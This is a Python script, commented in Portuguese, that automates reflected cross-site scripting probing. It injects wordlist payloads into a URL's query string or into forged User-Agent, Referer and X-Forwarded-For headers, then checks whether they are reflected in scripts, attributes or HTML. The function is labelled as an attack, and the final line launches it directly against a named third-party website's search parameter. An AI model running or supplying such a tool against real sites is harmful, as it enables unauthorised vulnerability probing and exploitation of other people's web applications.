import asyncio
import random
import re

import utils
import jsonlog
import commons

# target -> origem
# payload -> carga enviada
# response -> resposta bruta da request
# score_sqli -> score que atesta vulnerabilidade
# continue_ -> valor booleano que decide se continua ou nao apos encontrar vulnerabilidade
async def crawler_xss_reflected(target, payload, response):
    from bs4 import BeautifulSoup
    import html

    details = {
        'xss_reflected_script': False,
        'xss_reflected_attr': False,
        'xss_reflected_html': False,
    }

    soup = BeautifulSoup(response.content, 'html.parser')
    unescaped_html = html.unescape(response.text)
    banner = response.text[:500]

    for param in payload:
        for script in soup.find_all('script'):
            if script.string and param in script.string:
                details['xss_reflected_script'] = True
                break
        
        for tag in soup.find_all():
            for attr, value in tag.attrs.items():
                value = ' '.join(value) if isinstance(value, list) else str(value)
                if param in value:
                    details['xss_reflected_attr'] = True
        
        if param in unescaped_html:
            details['xss_reflected_html'] = True

    return details, banner


async def xss(target, wordlist_file, option, save_file, ua_status, headers, cookies, timeout, SSL, proxies, interval, continue_, try_requests, verbose):
    save_file = save_file if save_file.endswith('.json') else f'{save_file.rsplit(".", 1)[0]}.json'
    if wordlist_file is None:
        print(f'[#][{commons.time_now()}] Usando payloads padrao')
        wordlist_file = 'wordlists/xss/default.txt'

    status_payload, payloads = await commons.fileReader(wordlist_file)
    if not status_payload:
        print(f'[-][{commons.time_now()}] {payloads}')
        return False, payloads

    async def engine(payload, url, headers=None):
        await asyncio.sleep(interval)
        if verbose:
            print(f'[+][{commons.time_now()}] Tentando: {url}')
        if option == 'headers' and verbose:
            print(f'{" "*3}[>][{commons.time_now()}] {headers}')
        
        status, r = commons.request(url, timeout=timeout, SSL=SSL, headers=headers, cookies=cookies,
                                    ua_status=ua_status, redirect=False, proxies=proxies, try_requests=try_requests)
        
        if status:
            details, banner = await crawler_xss_reflected(target, [payload], r)
            if any(details.values()) and not continue_:
                print(f'[#][{commons.time_now()}][{r.status_code}] Possivel vulnerabilidade: {target} → {payload}')
                return True, f'[#][{commons.time_now()}] Wordlist concluida: {wordlist_file} → {save_file}'
        else:
            print(f'{" "*3}[>][{commons.time_now()}] Falha ao requisitar: {r}')
            details, banner = {}, ''
        
        json_obj = jsonlog.ObjectJsonCommon.from_data(
            domain=target, payload=payload, url=url, ip='', r=r,
            banner=banner, details=details
        )
        await jsonlog.AsyncLogger(save_file).json_write(json_obj)

    if option == 'query string':
        if not '*' in target:
            return False, f'[#][{commons.time_now()}] Nao ha indicativo de substituicao (*).. Ex: example.com/?=*'    
        for payload in payloads:
            payload = payload.strip()
            target = f"{target.split('://')[0]}://{target.split('://')[1]}" if target.startswith('http://') or target.startswith('https://') else f'https://{target}' if SSL else f'http://{target}'
            url = f'{target}'.replace('*', payload)
            await engine(payload, url)

        return True, f'[#][{commons.time_now()}] Wordlist concluida: {wordlist_file} → {save_file}'

    elif option == 'headers':
        total_combinations = len(payloads) ** 3
        used_combinations = set()

        while len(used_combinations) < total_combinations:
            current_headers = {
                'User-Agent': random.choice(payloads).strip(),
                'Referer': random.choice(payloads).strip(),
                'X-Forwarded-For': random.choice(payloads).strip(),
            }
            combo_key = frozenset(current_headers.items()) # matem a lista intacta
            if combo_key in used_combinations:
                continue

            used_combinations.add(combo_key)
            url = f"{target.split('://')[0]}://{target.split('://')[1]}" if target.startswith('http://') or target.startswith('https://') else f'https://{target}' if SSL else f'http://{target}'  # aqui o payload está no header, não na URL
            await engine(f'UA:{current_headers["User-Agent"]}|Ref:{current_headers["Referer"]}|IP:{current_headers["X-Forwarded-For"]}', url, headers=current_headers)

        return True, f'[#][{commons.time_now()}] Wordlist concluida: {wordlist_file} → {save_file}'

    else:
        return False, f'[-][{commons.time_now()}] Opcao invalida: {option}'


# Attack
async def main(target, wordlist_file='wordlists/xss/default.txt', option='query string', save_file='xss_test.json', ua_status=False, headers=None, cookies=None, timeout=10, SSL=True, proxies=None, interval=0, continue_=True, try_requests=1, verbose=True):
    try:
        status, attk = await xss(target, wordlist_file, option, save_file, ua_status, headers, cookies, timeout, SSL, proxies, interval, continue_, try_requests, verbose)
        if status:
            return True, f'[#] Execucao finalizada: {attk}'
        else:
            return False, f'[#] Execucao finalizada: {attk}'
    except Exception as err:
        return False, f'[#] Um erro surgiu & a execucao foi interrompida {err}'



print(asyncio.run(main('https://www.socasadas.com/?s=*')))